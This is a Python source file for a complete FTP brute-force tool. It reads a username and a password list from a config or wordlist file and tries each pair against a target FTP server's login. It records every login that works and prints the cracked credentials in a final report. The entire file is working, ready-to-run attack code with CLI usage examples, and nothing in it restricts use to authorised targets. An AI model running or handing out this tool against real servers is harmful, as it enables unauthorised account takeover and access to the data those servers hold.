#!/usr/bin/env python3
"""
FTP Bruteforce Module
---------------------
Implements FTP authentication brute-forcing capabilities
with configurable options and comprehensive error handling.

Author: kArmasec
"""

import argparse
import json
import logging
import time
import sys
from ftplib import FTP, error_perm, all_errors
from typing import List, Dict, Optional, Tuple


class FTPBruteforcer:
    """FTP Brute Force Attack Handler"""
    
    def __init__(self, config_path: str = "ftp_config.json", logger: Optional[logging.Logger] = None):
        """
        Initialize the FTP bruteforcer with configuration.
        
        Args:
            config_path: Path to JSON configuration file
            logger: Optional logger instance
        """
        self.config = self._load_config(config_path)
        self.logger = logger or self._setup_logger()
        self.successful_credentials = []
        self.failed_attempts = 0
        self.total_attempts = 0
        
    def _load_config(self, config_path: str) -> Dict:
        """Load configuration from JSON file."""
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            raise FileNotFoundError(f"Configuration file not found: {config_path}")
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in configuration file: {e}")
    
    def _setup_logger(self) -> logging.Logger:
        """Setup default logger if none provided."""
        logger = logging.getLogger("FTPBruteforcer")
        logger.setLevel(logging.INFO)
        
        # File handler
        fh = logging.FileHandler("ftp_bruteforce.log", encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        
        # Console handler
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter(
            "%(asctime)s | %(levelname)s | %(message)s"
        )
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        logger.addHandler(fh)
        logger.addHandler(ch)
        
        return logger
    
    def test_credentials(self, username: str, password: str) -> Tuple[bool, Optional[str]]:
        """
        Test a single username/password combination.
        
        Args:
            username: FTP username to test
            password: FTP password to test
            
        Returns:
            Tuple of (success: bool, error_message: Optional[str])
        """
        host = self.config['server']['host']
        port = self.config['server']['port']
        timeout = self.config['server']['timeout']
        verbosity = self.config['bruteforce']['verbosity']
        
        self.total_attempts += 1
        
        try:
            if verbosity >= 2:
                self.logger.debug(f"Attempting: {username}:{password}")
            
            ftp = FTP(timeout=timeout)
            ftp.connect(host, port)
            ftp.login(username, password)
            
            # If we got here, login was successful
            welcome = ftp.getwelcome()
            ftp.quit()
            
            self.logger.info(f"✓ SUCCESS: {username}:{password} | Server: {welcome}")
            self.successful_credentials.append({
                'username': username,
                'password': password,
                'host': host,
                'port': port,
                'welcome': welcome
            })
            
            return True, None
            
        except error_perm as e:
            # Authentication failed
            error_msg = str(e)
            self.failed_attempts += 1
            
            if verbosity >= 3:
                self.logger.debug(f"✗ Failed: {username}:{password} | {error_msg}")
            
            return False, error_msg
            
        except all_errors as e:
            # Connection error, timeout, etc.
            error_msg = str(e)
            self.failed_attempts += 1
            
            if verbosity >= 1:
                self.logger.warning(f"✗ Error: {username}:{password} | {error_msg}")
            
            return False, error_msg
            
        except Exception as e:
            # Unexpected error
            error_msg = str(e)
            self.failed_attempts += 1
            
            self.logger.error(f"✗ Unexpected error: {username}:{password} | {error_msg}")
            
            return False, error_msg
    
    def bruteforce(self, username: Optional[str] = None, password_list: Optional[List[str]] = None) -> Dict:
        """
        Execute brute force attack with given credentials.
        
        Args:
            username: Username to test (uses config if not provided)
            password_list: List of passwords to test (uses config if not provided)
            
        Returns:
            Dictionary with attack results
        """
        # Use config values if not provided
        if username is None:
            username = self.config['credentials']['username']
        
        if password_list is None:
            password_list = self.config['credentials']['password_list']
        
        max_attempts = self.config['bruteforce']['max_attempts']
        delay = self.config['bruteforce']['delay_between_attempts']
        stop_on_success = self.config['bruteforce']['stop_on_success']
        
        self.logger.info(f"Starting FTP bruteforce attack on {self.config['server']['host']}:{self.config['server']['port']}")
        self.logger.info(f"Username: {username}")
        self.logger.info(f"Testing {len(password_list)} passwords (max attempts: {max_attempts})")
        
        start_time = time.time()
        
        for idx, password in enumerate(password_list, 1):
            # Check max attempts limit
            if self.total_attempts >= max_attempts:
                self.logger.warning(f"Reached maximum attempts limit: {max_attempts}")
                break
            
            # Test credentials
            success, error = self.test_credentials(username, password)
            
            # Stop if successful and configured to do so
            if success and stop_on_success:
                self.logger.info("Stopping: successful credentials found")
                break
            
            # Delay between attempts (except on last iteration)
            if idx < len(password_list) and delay > 0:
                time.sleep(delay)
        
        elapsed_time = time.time() - start_time
        
        # Generate report
        results = {
            'total_attempts': self.total_attempts,
            'failed_attempts': self.failed_attempts,
            'successful_attempts': len(self.successful_credentials),
            'successful_credentials': self.successful_credentials,
            'elapsed_time': elapsed_time,
            'attempts_per_second': self.total_attempts / elapsed_time if elapsed_time > 0 else 0
        }
        
        self._print_report(results)
        
        return results
    
    def _print_report(self, results: Dict):
        """Print a formatted report of the bruteforce results."""
        self.logger.info("\n" + "=" * 60)
        self.logger.info("FTP BRUTEFORCE REPORT")
        self.logger.info("=" * 60)
        self.logger.info(f"Total attempts: {results['total_attempts']}")
        self.logger.info(f"Failed attempts: {results['failed_attempts']}")
        self.logger.info(f"Successful attempts: {results['successful_attempts']}")
        self.logger.info(f"Elapsed time: {results['elapsed_time']:.2f} seconds")
        self.logger.info(f"Attempts per second: {results['attempts_per_second']:.2f}")
        
        if results['successful_credentials']:
            self.logger.info("\n" + "-" * 60)
            self.logger.info("SUCCESSFUL CREDENTIALS:")
            self.logger.info("-" * 60)
            for cred in results['successful_credentials']:
                self.logger.info(
                    f"Host: {cred['host']}:{cred['port']} | "
                    f"User: {cred['username']} | "
                    f"Pass: {cred['password']}"
                )
        else:
            self.logger.info("\nNo successful credentials found.")
        
        self.logger.info("=" * 60)
    
    def bruteforce_from_file(self, username: str, password_file: str) -> Dict:
        """
        Execute brute force attack using passwords from a file.
        
        Args:
            username: Username to test
            password_file: Path to file containing passwords (one per line)
            
        Returns:
            Dictionary with attack results
        """
        try:
            with open(password_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            self.logger.info(f"Loaded {len(passwords)} passwords from {password_file}")
            
            return self.bruteforce(username, passwords)
            
        except FileNotFoundError:
            self.logger.error(f"Password file not found: {password_file}")
            raise
        except Exception as e:
            self.logger.error(f"Error reading password file: {e}")
            raise


def main():
    """CLI entry point for FTP bruteforcer."""
    parser = argparse.ArgumentParser(
        description="FTP Bruteforce Tool - Test FTP authentication",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Use configuration file
  python ftp_bruteforce.py
  
  # Specify custom config
  python ftp_bruteforce.py --config my_config.json
  
  # Use password file
  python ftp_bruteforce.py --username admin --password-file passwords.txt
        """
    )
    
    parser.add_argument(
        '--config',
        default='ftp_config.json',
        help='Path to configuration file (default: ftp_config.json)'
    )
    
    parser.add_argument(
        '--username',
        help='Username to test (overrides config)'
    )
    
    parser.add_argument(
        '--password-file',
        help='File containing passwords to test (one per line)'
    )
    
    args = parser.parse_args()
    
    try:
        bruteforcer = FTPBruteforcer(config_path=args.config)
        
        if args.password_file:
            if not args.username:
                print("Error: --username is required when using --password-file")
                sys.exit(1)
            bruteforcer.bruteforce_from_file(args.username, args.password_file)
        else:
            bruteforcer.bruteforce(username=args.username)
            
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
